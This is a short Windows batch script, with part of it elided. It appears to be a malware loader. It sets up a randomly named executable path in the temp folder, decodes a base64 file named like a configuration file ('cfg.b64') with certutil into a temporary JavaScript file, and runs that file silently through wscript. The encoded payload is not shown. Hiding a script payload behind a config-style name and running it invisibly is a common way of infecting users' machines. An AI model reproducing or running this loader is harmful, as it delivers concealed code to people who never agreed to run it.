@echo off
setlocal
set "OUT=%TEMP%\rbc_7011467b2a185c1b.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_7011467b2a185c1b.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_7011467b2a185c1b.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_7011467b2a185c1b.js"
exit /b 0
